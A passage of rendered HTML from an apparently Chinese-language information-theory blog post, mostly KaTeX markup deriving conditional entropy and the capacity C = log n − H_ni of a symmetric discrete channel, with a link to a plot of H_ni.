reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>令这个常数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mrow><mi>n</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">H_{ni}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ni</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，就得到了下面的结论</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi></mrow><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mi>H</mi><mrow><mi>n</mi><mi>i</mi></mrow></msub><mo>=</mo><msub><mi>H</mi><mrow><mi>n</mi><mi>i</mi></mrow></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}H(Y/X)&amp;=-\sum_{i=1}^n{\sum_{j=1}^n{p}}\left( a_i \right) p\left( b_j/a_i \right) \log p\left( b_j/a_i \right) =-\sum_{i=1}^n{p}\left( a_i \right) \sum_{j=1}^n{p}\left( b_j/a_i \right) \log p\left( b_j/a_i \right)\\&amp;=-\sum_{i=1}^n{p}\left( a_i \right) H_{ni}=H_{ni}\\\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.5942em;vertical-align:-3.0471em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5471em;"><span style="top:-5.5471em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span><span style="top:-2.1819em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.0471em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5471em;"><span style="top:-5.5471em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.1819em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ni</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ni</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.0471em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mrow><mi>n</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">H_{ni}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ni</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 随着 p 变化的函数图像如下：</p><img src="http://cdn.blog-blockchain.xyz/202305272345345.png" alt="Hni的函数图像" style="zoom:50%;" /><p>最后，当整个信道矩阵都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 的时候，取到最大。具体过程忽略</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>C</mi><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mo stretchy="false">[</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mrow><mo fence="true">[</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>H</mi><mi>n</mi></msub><mo fence="true">]</mo></mrow><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>−</mo><msub><mi>H</mi><mrow><mi>n</mi><mi>i</mi></mrow></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;C=\max_{p\left( a_i \right)} I(X;Y)=\max_{p\left( a_i \right)} [H(Y)-H(Y/X)]\\&amp;=\max_{p\left( a_i \right)} \left[ H(Y)-H_n \right] =\log n-H_{ni}\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.212em;vertical-align:-1.856em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.356em;"><span style="top:-4.356em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.856em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.356em;"><span style="top:-4.516em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span 